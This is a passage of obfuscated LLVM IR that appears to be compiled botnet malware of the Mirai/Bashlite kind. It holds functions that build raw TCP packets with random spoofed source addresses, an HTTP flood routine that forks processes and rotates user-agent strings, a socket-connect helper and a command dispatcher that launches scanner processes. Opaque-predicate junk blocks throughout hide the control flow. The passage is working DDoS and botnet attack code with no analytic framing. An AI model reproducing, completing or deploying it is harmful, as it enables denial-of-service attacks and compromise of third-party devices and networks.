  %592 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %593 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %592, i32 0, i32 0
  %594 = load i32, i32* %593, align 4
  %595 = load i32, i32* %19, align 4
  %596 = call i32 @getRandomIP(i32 %595)
  %597 = call i32 @htonl(i32 %596) #10
  %598 = load i32, i32* %12, align 4
  %599 = sext i32 %598 to i64
  %_28 = sub i64 0, 20
  %gen29 = add i64 %_28, %599
  %600 = add i64 20, %599
  %601 = trunc i64 %600 to i32
  call void @makeIPPacket(%struct.iphdr* %591, i32 %594, i32 %597, i8 zeroext 6, i32 %601)
  %602 = call i32 @rand_cmwc()
  %603 = trunc i32 %602 to i16
  %604 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %605 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %604, i32 0, i32 0
  %606 = bitcast %union.anon* %605 to %struct.anon.0*
  %607 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %606, i32 0, i32 0
  store i16 %603, i16* %607, align 4
  %608 = call i32 @rand_cmwc()
  %609 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %610 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %609, i32 0, i32 0
  %611 = bitcast %union.anon* %610 to %struct.anon.0*
  %612 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %611, i32 0, i32 2
  store i32 %608, i32* %612, align 4
  %613 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %614 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %613, i32 0, i32 0
  %615 = bitcast %union.anon* %614 to %struct.anon.0*
  %616 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %615, i32 0, i32 3
  store i32 0, i32* %616, align 4
  %617 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %618 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %617, i32 0, i32 0
  %619 = bitcast %union.anon* %618 to %struct.anon.0*
  %620 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %619, i32 0, i32 4
  %621 = load i16, i16* %620, align 4
  %_30 = sub i16 %621, -241
  %gen31 = mul i16 %_30, -241
  %_32 = sub i16 %621, -241
  %gen33 = mul i16 %_32, -241
  %622 = and i16 %621, -241
  %_34 = sub i16 0, %622
  %gen35 = add i16 %_34, 80
  %_36 = sub i16 0, %622
  %gen37 = add i16 %_36, 80
  %623 = or i16 %622, 80
  store i16 %623, i16* %620, align 4
  %624 = load i8*, i8** %11, align 8
  %625 = call i32 @strcmp(i8* %624, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.501, i32 0, i32 0)) #9
  %626 = icmp ne i32 %625, 0
  br label %originalBB14

originalBB41alteredBB:                            ; preds = %originalBB41, %234
  %627 = load i8*, i8** %23, align 8
  %628 = icmp ne i8* %627, null
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %253
  %629 = load i8*, i8** %23, align 8
  %630 = call i32 @strcmp(i8* %629, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.503, i32 0, i32 0)) #9
  %631 = icmp ne i32 %630, 0
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %309
  %632 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %633 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %632, i32 0, i32 0
  %634 = bitcast %union.anon* %633 to %struct.anon.0*
  %635 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %634, i32 0, i32 4
  %636 = load i16, i16* %635, align 4
  %_50 = sub i16 %636, -4097
  %gen51 = mul i16 %_50, -4097
  %_52 = shl i16 %636, -4097
  %_53 = shl i16 %636, -4097
  %_54 = shl i16 %636, -4097
  %_55 = sub i16 %636, -4097
  %gen56 = mul i16 %_55, -4097
  %_57 = sub i16 0, %636
  %gen58 = add i16 %_57, -4097
  %_59 = shl i16 %636, -4097
  %_60 = shl i16 %636, -4097
  %637 = and i16 %636, -4097
  %_61 = sub i16 0, %637
  %gen62 = add i16 %_61, 4096
  %_63 = sub i16 0, %637
  %gen64 = add i16 %_63, 4096
  %638 = or i16 %637, 4096
  store i16 %638, i16* %635, align 4
  br label %originalBB49

originalBB68alteredBB:                            ; preds = %originalBB68, %337
  %639 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %640 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %639, i32 0, i32 0
  %641 = bitcast %union.anon* %640 to %struct.anon.0*
  %642 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %641, i32 0, i32 4
  %643 = load i16, i16* %642, align 4
  %_69 = sub i16 0, %643
  %gen70 = add i16 %_69, -2049
  %644 = and i16 %643, -2049
  %_71 = sub i16 %644, 2048
  %gen72 = mul i16 %_71, 2048
  %_73 = sub i16 0, %644
  %gen74 = add i16 %_73, 2048
  %_75 = sub i16 0, %644
  %gen76 = add i16 %_75, 2048
  %_77 = sub i16 0, %644
  %gen78 = add i16 %_77, 2048
  %_79 = sub i16 0, %644
  %gen80 = add i16 %_79, 2048
  %_81 = sub i16 0, %644
  %gen82 = add i16 %_81, 2048
  %_83 = sub i16 %644, 2048
  %gen84 = mul i16 %_83, 2048
  %645 = or i16 %644, 2048
  store i16 %645, i16* %642, align 4
  br label %originalBB68

originalBB88alteredBB:                            ; preds = %originalBB88, %363
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %385
  %646 = call i32 @rand_cmwc()
  %647 = trunc i32 %646 to i16
  %648 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %649 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %648, i32 0, i32 0
  %650 = bitcast %union.anon* %649 to %struct.anon.0*
  %651 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %650, i32 0, i32 5
  store i16 %647, i16* %651, align 2
  %652 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %653 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %652, i32 0, i32 0
  %654 = bitcast %union.anon* %653 to %struct.anon.0*
  %655 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %654, i32 0, i32 6
  store i16 0, i16* %655, align 4
  %656 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %657 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %656, i32 0, i32 0
  %658 = bitcast %union.anon* %657 to %struct.anon.0*
  %659 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %658, i32 0, i32 7
  store i16 0, i16* %659, align 2
  %660 = load i32, i32* %9, align 4
  %661 = icmp eq i32 %660, 0
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %418
  %662 = call i32 @rand_cmwc()
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %515
  %663 = call i64 @time(i64* null) #5
  %664 = load i32, i32* %24, align 4
  %665 = sext i32 %664 to i64
  %666 = icmp sgt i64 %663, %665
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %538
  %667 = load i32, i32* %25, align 4
  %_105 = sub i32 %667, 1
  %gen106 = mul i32 %_105, 1
  %_107 = sub i32 %667, 1
  %gen108 = mul i32 %_107, 1
  %668 = add i32 %667, 1
  store i32 %668, i32* %25, align 4
  br label %originalBB104

originalBB112alteredBB:                           ; preds = %originalBB112, %557
  %669 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %669)
  br label %originalBB112
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #5
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #10
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #5
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* @x.81
  %47 = load i32, i32* @y.82
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %45
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* @x.81
  %56 = load i32, i32* @y.82
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %54

originalBBalteredBB:                              ; preds = %originalBB, %45
  %63 = load i32, i32* %3, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = load i32, i32* @x.83
  %8 = load i32, i32* @y.84
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca [512 x i8], align 16
  %26 = alloca [1 x i8], align 1
  store i8* %0, i8** %15, align 8
  store i8* %1, i8** %16, align 8
  store i16 %2, i16* %17, align 2
  store i8* %3, i8** %18, align 8
  store i32 %4, i32* %19, align 4
  store i32 %5, i32* %20, align 4
  %27 = call i64 @time(i64* null) #5
  %28 = load i32, i32* %19, align 4
  %29 = sext i32 %28 to i64
  %30 = add nsw i64 %27, %29
  %31 = trunc i64 %30 to i32
  store i32 %31, i32* %23, align 4
  store i32 0, i32* %24, align 4
  store i32 0, i32* %22, align 4
  %32 = load i32, i32* @x.83
  %33 = load i32, i32* @y.84
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %147, %originalBBpart2
  %41 = load i32, i32* %22, align 4
  %42 = load i32, i32* %20, align 4
  %43 = icmp slt i32 %41, %42
  br i1 %43, label %44, label %150

; <label>:44:                                     ; preds = %40
  %45 = load i32, i32* @x.83
  %46 = load i32, i32* @y.84
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %44
  %53 = getelementptr inbounds [512 x i8], [512 x i8]* %25, i32 0, i32 0
  %54 = load i8*, i8** %15, align 8
  %55 = load i8*, i8** %18, align 8
  %56 = load i8*, i8** %16, align 8
  %57 = call i32 @rand() #5
  %58 = srem i32 %57, 59
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %59
  %61 = load i8*, i8** %60, align 8
  %62 = call i32 (i8*, i8*, ...) @sprintf(i8* %53, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.509, i32 0, i32 0), i8* %54, i8* %55, i8* %56, i8* %61) #5
  %63 = call i32 @fork() #5
  %64 = icmp ne i32 %63, 0
  %65 = load i32, i32* @x.83
  %66 = load i32, i32* @y.84
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart223, label %originalBB11alteredBB

originalBBpart223:                                ; preds = %originalBB11
  br i1 %64, label %73, label %146

; <label>:73:                                     ; preds = %originalBBpart223
  br label %74

; <label>:74:                                     ; preds = %originalBBpart235, %73
  %75 = load i32, i32* @x.83
  %76 = load i32, i32* @y.84
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %74
  %83 = load i32, i32* %23, align 4
  %84 = sext i32 %83 to i64
  %85 = call i64 @time(i64* null) #5
  %86 = icmp sgt i64 %84, %85
  %87 = load i32, i32* @x.83
  %88 = load i32, i32* @y.84
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br i1 %86, label %95, label %145

; <label>:95:                                     ; preds = %originalBBpart227
  %96 = load i32, i32* @x.83
  %97 = load i32, i32* @y.84
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %95
  %104 = load i8*, i8** %16, align 8
  %105 = load i16, i16* %17, align 2
  %106 = call i32 @socket_connect(i8* %104, i16 zeroext %105)
  store i32 %106, i32* %21, align 4
  %107 = load i32, i32* %21, align 4
  %108 = icmp ne i32 %107, 0
  %109 = load i32, i32* @x.83
  %110 = load i32, i32* @y.84
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %108, label %117, label %128

; <label>:117:                                    ; preds = %originalBBpart231
  %118 = load i32, i32* %21, align 4
  %119 = getelementptr inbounds [512 x i8], [512 x i8]* %25, i32 0, i32 0
  %120 = getelementptr inbounds [512 x i8], [512 x i8]* %25, i32 0, i32 0
  %121 = call i64 @strlen(i8* %120) #9
  %122 = call i64 @write(i32 %118, i8* %119, i64 %121)
  %123 = load i32, i32* %21, align 4
  %124 = getelementptr inbounds [1 x i8], [1 x i8]* %26, i32 0, i32 0
  %125 = call i64 @read(i32 %123, i8* %124, i64 1)
  %126 = load i32, i32* %21, align 4
  %127 = call i32 @close(i32 %126)
  br label %128

; <label>:128:                                    ; preds = %117, %originalBBpart231
  %129 = load i32, i32* @x.83
  %130 = load i32, i32* @y.84
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %128
  %137 = load i32, i32* @x.83
  %138 = load i32, i32* @y.84
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %74

; <label>:145:                                    ; preds = %originalBBpart227
  call void @exit(i32 0) #12
  unreachable

; <label>:146:                                    ; preds = %originalBBpart223
  br label %147

; <label>:147:                                    ; preds = %146
  %148 = load i32, i32* %22, align 4
  %149 = add nsw i32 %148, 1
  store i32 %149, i32* %22, align 4
  br label %40

; <label>:150:                                    ; preds = %40
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %6
  %151 = alloca i8*, align 8
  %152 = alloca i8*, align 8
  %153 = alloca i16, align 2
  %154 = alloca i8*, align 8
  %155 = alloca i32, align 4
  %156 = alloca i32, align 4
  %157 = alloca i32, align 4
  %158 = alloca i32, align 4
  %159 = alloca i32, align 4
  %160 = alloca i32, align 4
  %161 = alloca [512 x i8], align 16
  %162 = alloca [1 x i8], align 1
  store i8* %0, i8** %151, align 8
  store i8* %1, i8** %152, align 8
  store i16 %2, i16* %153, align 2
  store i8* %3, i8** %154, align 8
  store i32 %4, i32* %155, align 4
  store i32 %5, i32* %156, align 4
  %163 = call i64 @time(i64* null) #5
  %164 = load i32, i32* %155, align 4
  %165 = sext i32 %164 to i64
  %_ = shl i64 %163, %165
  %_1 = sub i64 0, %163
  %gen = add i64 %_1, %165
  %_2 = sub i64 %163, %165
  %gen3 = mul i64 %_2, %165
  %_4 = shl i64 %163, %165
  %_5 = sub i64 0, %163
  %gen6 = add i64 %_5, %165
  %_7 = sub i64 %163, %165
  %gen8 = mul i64 %_7, %165
  %_9 = sub i64 0, %163
  %gen10 = add i64 %_9, %165
  %166 = add nsw i64 %163, %165
  %167 = trunc i64 %166 to i32
  store i32 %167, i32* %159, align 4
  store i32 0, i32* %160, align 4
  store i32 0, i32* %158, align 4
  br label %originalBB

originalBB11alteredBB:                            ; preds = %originalBB11, %44
  %168 = getelementptr inbounds [512 x i8], [512 x i8]* %25, i32 0, i32 0
  %169 = load i8*, i8** %15, align 8
  %170 = load i8*, i8** %18, align 8
  %171 = load i8*, i8** %16, align 8
  %172 = call i32 @rand() #5
  %_12 = shl i32 %172, 59
  %_13 = sub i32 0, %172
  %gen14 = add i32 %_13, 59
  %_15 = sub i32 0, %172
  %gen16 = add i32 %_15, 59
  %_17 = sub i32 %172, 59
  %gen18 = mul i32 %_17, 59
  %_19 = shl i32 %172, 59
  %_20 = sub i32 0, %172
  %gen21 = add i32 %_20, 59
  %173 = srem i32 %172, 59
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %174
  %176 = load i8*, i8** %175, align 8
  %177 = call i32 (i8*, i8*, ...) @sprintf(i8* %168, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.509, i32 0, i32 0), i8* %169, i8* %170, i8* %171, i8* %176) #5
  %178 = call i32 @fork() #5
  %179 = icmp ne i32 %178, 0
  br label %originalBB11

originalBB25alteredBB:                            ; preds = %originalBB25, %74
  %180 = load i32, i32* %23, align 4
  %181 = sext i32 %180 to i64
  %182 = call i64 @time(i64* null) #5
  %183 = icmp sgt i64 %181, %182
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %95
  %184 = load i8*, i8** %16, align 8
  %185 = load i16, i16* %17, align 2
  %186 = call i32 @socket_connect(i8* %184, i16 zeroext %185)
  store i32 %186, i32* %21, align 4
  %187 = load i32, i32* %21, align 4
  %188 = icmp ne i32 %187, 0
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %128
  br label %originalBB33
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i8*, align 8
  %36 = alloca i32, align 4
  %37 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i32 0, i32 0)) #9
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

; <label>:43:                                     ; preds = %2
  br label %1273

; <label>:44:                                     ; preds = %2
  %45 = load i32, i32* @x.85
  %46 = load i32, i32* @y.86
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %44
  %53 = load i8**, i8*** %4, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 0
  %55 = load i8*, i8** %54, align 8
  %56 = call i32 @strcmp(i8* %55, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.511, i32 0, i32 0)) #9
  %57 = icmp ne i32 %56, 0
  %58 = load i32, i32* @x.85
  %59 = load i32, i32* @y.86
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %57, label %266, label %66

; <label>:66:                                     ; preds = %originalBBpart2
  %67 = load i32, i32* @x.85
  %68 = load i32, i32* @y.86
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %66
  %75 = load i8**, i8*** %4, align 8
  %76 = getelementptr inbounds i8*, i8** %75, i64 1
  %77 = load i8*, i8** %76, align 8
  %78 = call i32 @strcmp(i8* %77, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.512, i32 0, i32 0)) #9
  %79 = icmp ne i32 %78, 0
  %80 = load i32, i32* @x.85
  %81 = load i32, i32* @y.86
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %79, label %181, label %88

; <label>:88:                                     ; preds = %originalBBpart24
  %89 = call i32 @fork() #5
  store i32 %89, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %90 = call i64 @sysconf(i32 84) #5
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %7, align 4
  store i32 999999, i32* %8, align 4
  %92 = load i32, i32* %7, align 4
  %93 = icmp eq i32 %92, 1
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %88
  store i32 500, i32* %8, align 4
  br label %95

; <label>:95:                                     ; preds = %94, %88
  %96 = load i32, i32* %7, align 4
  %97 = icmp sge i32 %96, 2
  br i1 %97, label %98, label %115

; <label>:98:                                     ; preds = %95
  %99 = load i32, i32* @x.85
  %100 = load i32, i32* @y.86
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %98
  store i32 1000, i32* %8, align 4
  %107 = load i32, i32* @x.85
  %108 = load i32, i32* @y.86
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %115

; <label>:115:                                    ; preds = %originalBBpart28, %95
  %116 = load i32, i32* @x.85
  %117 = load i32, i32* @y.86
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %115
  %124 = load i32, i32* %5, align 4
  %125 = icmp ugt i32 %124, 0
  %126 = load i32, i32* @x.85
  %127 = load i32, i32* @y.86
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %125, label %134, label %136

; <label>:134:                                    ; preds = %originalBBpart212
  %135 = load i32, i32* %5, align 4
  store i32 %135, i32* @scanPid, align 4
  br label %1273

; <label>:136:                                    ; preds = %originalBBpart212
  %137 = load i32, i32* %5, align 4
  %138 = icmp eq i32 %137, -1
  br i1 %138, label %139, label %140

; <label>:139:                                    ; preds = %136
  br label %1273

; <label>:140:                                    ; preds = %136
  %141 = load i32, i32* @x.85
  %142 = load i32, i32* @y.86
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %140
  %149 = load i32, i32* @x.85
  %150 = load i32, i32* @y.86
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %157

; <label>:157:                                    ; preds = %originalBBpart216
  store i32 0, i32* %6, align 4
  br label %158

; <label>:158:                                    ; preds = %177, %157
  %159 = load i32, i32* %6, align 4
  %160 = load i32, i32* %7, align 4
  %161 = icmp slt i32 %159, %160
